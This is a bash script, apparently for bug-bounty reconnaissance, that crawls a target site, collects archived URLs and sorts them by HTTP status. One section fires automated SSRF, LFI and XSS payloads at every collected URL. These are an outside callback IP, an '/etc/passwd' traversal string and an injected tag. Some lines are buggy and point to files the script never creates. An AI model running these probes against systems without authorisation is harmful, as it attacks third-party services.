source ~/.profile

read -p "Enter your program name: " programName

read -p " Enter your URL: " url

echo -e "\e[32m[+] - Run Katana \e[0m"
katana -u $url -headless -system-chrome -headless-options --disable-gpu -d 4 -c 5  -ef css -silent --no-sandbox | tee -a urls.txt
clear

echo -e "\e[32m[+] - Run GoSpider \e[0m"
gospider -s "$url" --include-other-source --include-subs --quiet --length --sitemap --blacklist ".(css|pdf|svg|png)" | tee -a gospider.txt
cat gospider.txt | cut -d "-" -f5 >> urls.txt
rm gospider.txt
clear

echo -e "\e[32m[+] - Run xnLinkFinder \e[0m"
python3 ~/usr/local/tools/xnLinkFinder/xnLinkFinder.py -i $url -sp $url -sf $url -d 3 -o target_burp.txt
cat target_burp.txt >> urls.txt
rm target_burp.txt
clear

echo -e "\e[32m[+] - Send request to WebArchive \e[0m"
curl -s  https://web.archive.org/cdx/search/cdx\?url=$url\&fl=timestamp >> timstamps.txt
clear

echo -e "\e[32m[+] - Send request to WebArchive for links \e[0m"
curl -s "https://web.archive.org/web/timemap/json?url=https://secure.message.t-mobile.com&matchType=prefix&collapse=urlkey&output=json&fl=original%2Cmimetype%2Ctimestamp%2Cendtimestamp%2Cgroupcount%2Cuniqcount" | jq -r ".[][0]" | tee -a urls.txt
clear

for time_stamp in $(cat "timstamps.txt"); do

  download_url="https://web.archive.org/web/$time_stamp/$url/robots.txt"
  
  wget "$download_url" -O robot.txt
  
 
  if [ $? -eq 0 ]; then
    cat robot.txt | cut -d ":" -f2 | sed "s~^~$url~" > robots.txt
    echo -e "\e[32m [+] -- Download was successful with time stamp $time_stamp.\e[0m"
    
    rm robot.txt
  else
    echo -e "\e[31m [-] -- Download failed with timestamp $time_stamp.\e[0m"
  fi
done
clear

# Merge urls
cat urls.txt robots.txt | sort -u | deduplicate --hide-useless --sort | bbrf -p $programName url add - --show-new | cut -d " " -f2 |  tee -a new-urls.txt
bbrf alert new-urls.txt
rm robots.txt
clear

# Check SSRF
cat u.txt | qsreplace "http://103.75.197.130:1000" | sed "s/%3A/:/g" | sed "s/%2F/\//g" | xargs -I % -P 10 sh -c 'curl -s "%" 2>&1'

# Check LFI
cat urls.txt | qsreplace "../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00"| sed "s/%25/%/g" | xargs -I "%" -P 20 sh -c 'a="%" && curl -s "$a" 2>&1' | grep -q "root" && echo "vulnerable $a" >> LFI.txt

#chek xss
cat gapUrls.txt | \
qsreplace 'attacker"/><reza>' | \
sed "s/%3A/:/g" | \
sed "s/%27/'/g" | \
sed 's/%22/"/g' | \
sed "s/%3E/>/g" | \
sed "s/%3C/</g" | \
sed "s/%2F/\//g" | \
while IFS= read -r line; do
  response=$(curl -s "$line")
  if echo "$response" | grep -q "<reza>"; then
    echo "$line" >> xss.txt
  fi
done
# Run HTTPX
echo -e "\e[32m[+] - Run HTTPx on links \e[0m"
httpx -l new-urls.txt -sc -follow-host-redirects -td -title -probe -cdn -tech-detect -random-agent -ip | tee -a HTTPx-URLs.txt
clear

# Add to BBRF server
cat HTTPx-URLs.txt | grep 200 | cut -d " " -f1 | bbrf -p $programName url update - -t status:200 --show-new | tee -a new-200-urls.txt
bbrf aler new-200-urls.txt
rm new-200-urls.txt
clear

cat HTTPx-URLs.txt | grep 301 | cut -d " " -f1 | bbrf -p $programName url add - -t status:301 --show-new | tee -a new-301-urls.txt
bbrf aler new-301-urls.txt
rm new-301-urls.txt
clear

cat HTTPx-URLs.txt | grep 302 | cut -d " " -f1 | bbrf -p $programName url add - -t status:302 --show-new | tee -a new-302-urls.txt
bbrf aler new-302-urls.txt
rm new-302-urls.txt
clear

cat HTTPx-URLs.txt | grep 403 | cut -d " " -f1 | bbrf -p $programName url add - -t status:403 --show-new | tee -a new-403-urls.txt
bbrf aler new-403-urls.txt
rm new-403-urls.txt
clear

cat HTTPx-URLs.txt | grep 404 | cut -d " " -f1 | bbrf -p $programName url add - -t status:404 --show-new | tee -a new-404-urls.txt
bbrf aler new-404-urls.txt
rm new-404-urls.txt
clear

cat HTTPx-URLs.txt | grep 501 | cut -d " " -f1 | bbrf -p $programName url add - -t status:503 --show-new | tee -a new-501-urls.txt
bbrf aler new-501-urls.txt
rm new-501-urls.txt
clear

cat HTTPx-URLs.txt | grep 503 | cut -d " " -f1 | bbrf -p $programName url add - -t status:503 --show-new | tee -a new-503-urls.txt
bbrf aler new-503-urls.txt
rm new-503-urls.txt
clear